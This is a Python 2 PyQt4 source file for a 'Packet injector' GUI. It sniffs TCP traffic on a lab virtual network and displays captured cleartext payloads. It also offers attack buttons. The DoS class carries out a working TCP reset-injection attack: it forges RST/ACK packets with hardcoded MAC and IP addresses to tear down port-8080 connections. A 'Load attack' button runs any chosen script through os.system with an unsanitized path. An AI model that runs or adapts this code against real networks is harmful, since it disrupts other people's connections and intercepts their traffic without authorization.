#!/bin/python

import sys
from PyQt4.QtCore import pyqtSlot, SIGNAL,SLOT
from PyQt4.QtCore import QTimer, QThread
from PyQt4.QtGui import *
from scapy.all import *
import sys
import os

# RST ATTACK

from scapy.all import *

FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80


def getFlags(F):
    f = []
    if F & FIN:
        f.append('FIN')
    if F & SYN:
        f.append('SYN')
    if F & RST:
        f.append('RST')
    if F & PSH:
        f.append('PSH')
    if F & ACK:
        f.append('ACK')
    if F & URG:
        f.append('URG')
    if F & ECE:
        f.append('ECE')
    if F & CWR:
        f.append('CWR')
    return f

class DoS(QThread):
    def __init__(self):
        QThread.__init__(self)

    def __del__(self):
        self.wait()

    def inj(self, pacote, pkt):
        pacote[TCP].dport = pkt[TCP].sport
        pacote[TCP].ack = pkt[TCP].seq + 1
        del pacote[IP].chksum
        del pacote[TCP].chksum
        #pacote.show2()
        #for i in range(0, 15):
        sendp(pacote, iface="virbr0")
        print("DoS done")


    def attack_dos(self):
        print("Lauching DoS...")
        pacote = Ether()/IP()/TCP()

        # Ether
        pacote[Ether].dst = "52:54:00:d4:c2:37"
        pacote[Ether].src = "52:54:00:f4:4a:bc"

        # IP
        pacote[IP].ihl = 5
        pacote[IP].id = 1298
        pacote[IP].flags="DF"
        pacote[IP].src = "192.168.122.95"
        pacote[IP].dst = "192.168.122.142"
        pacote[IP].len = 40
        #pacote[IP].chksum =  0x7d9e

        # TCP
        pacote[TCP].sport = 8080
        pacote[TCP].seq = 0
        pacote[TCP].dataofs=5
        pacote[TCP].flags="RA"
        pacote[TCP].window=0
        #pacote[TCP].chksum=0x274a
        pacote[TCP].options={}

        sniffing  = sniff(iface = "virbr0", filter = "port 8080", count = 1, prn=lambda x: self.inj(pacote, x))

    def run(self):
        self.attack_dos()

class Sniffer(QThread):

    def __init__(self):
        QThread.__init__(self)
        self.i = 0
        self.table = None

    def __del__(self):
        self.wait()

    def setTable(self, table):
        self.table = table

    def capture(self):
        s = sniff(filter="tcp", prn=lambda packet: self.unpack(packet))

    def unpack(self, packet):
        src = packet[IP].src
        dst = packet[IP].dst
        sport = packet[TCP].sport
        dport = packet[TCP].dport
        flags = packet[TCP].flags
        flags = getFlags(flags)
        if 'PSH' in flags:
            if sport == 443 or dport == 443 or sport == 22 or dport == 22:
                raw = "Encrypted payload (" + str(sys.getsizeof(packet[Raw].load)) + " bytes)"
            else:
                raw = "Payload: " + str(packet[Raw].load)
        else:
            raw = ""

        self.updateTable(src, dst, str(sport), str(dport), str(flags), raw)

    def updateTable(self, src, dst, sport, dport, flags, raw):
        self.table.setItem(self.i,0, QTableWidgetItem(src))
        self.table.setItem(self.i,1, QTableWidgetItem(dst))
        self.table.setItem(self.i,2, QTableWidgetItem(sport))
        self.table.setItem(self.i,3, QTableWidgetItem(dport))
        self.table.setItem(self.i,4, QTableWidgetItem(str(flags)))
        self.table.setItem(self.i,5, QTableWidgetItem(raw))
        self.i += 1

    def run(self):
        self.capture()

class customAttack(QThread):
    def __init__(self):
        QThread.__init__(self)
        self.attack_file = None

    def __del__(self):
        self.wait()

    def getFile(self, window):
        self.attack_file = QFileDialog.getOpenFileName(window, 'Open file',
            'c:\\',"Scapy script (*.py)")

    def run(self):
        os.system('python2 ' + self.attack_file)

if __name__ == "__main__":

    # create our window
    app = QApplication(sys.argv)
    w = QWidget()
    w.setWindowTitle('Packet injector')
    w.resize(700, 700)

    # set layout
    grid = QGridLayout()
    grid.setSpacing(10)
    #grid.setRowStretch(1, 1)
    w.setLayout(grid)

    # set title label
    title_label = QLabel('Packet injector')
    grid.addWidget(title_label, 0, 0)

    # prepare table
    table 	= QTableWidget()
    tableItem 	= QTableWidgetItem()
    table.setRowCount(1000)
    table.setColumnCount(6)
    table.setHorizontalHeaderLabels(("IP src; IP dst; Port src; Port dst; Flags; Raw").split(";"))
    grid.addWidget(table, 1, 0, 1, 3)

    # prepare "Attack" label
    attack_label = QLabel('Attacks')
    grid.addWidget(attack_label, 2, 0)

    # create DoS button
    btn_dos = QPushButton('DoS (AresS)')
    dos = DoS()
    @pyqtSlot()
    def on_click():
        dos.start()

    grid.addWidget(btn_dos, 3, 0)
    btn_dos.clicked.connect(on_click)


    # create Load attack button
    custom_attack = customAttack()
    btn_load = QPushButton('Load attack')
    @pyqtSlot()
    def on_click():
        custom_attack.getFile(w)
        load_label.setText(custom_attack.attack_file)
        btn_attack.setEnabled(True)

    grid.addWidget(btn_load, 4, 0)
    btn_load.clicked.connect(on_click)

    # prepare "Load" label
    load_label = QLabel('Nothing loaded')
    grid.addWidget(load_label, 4, 1)

    # create Load attack button
    btn_attack = QPushButton('Attack!')
    btn_attack.setEnabled(False)
    @pyqtSlot()
    def on_click():
        custom_attack.start()

    grid.addWidget(btn_attack, 4, 2)
    btn_attack.clicked.connect(on_click)


    # start sniffing
    thread = Sniffer()
    thread.setTable(table)
    thread.start()

    # Show the window and run the app
    w.show()
    app.exec_()
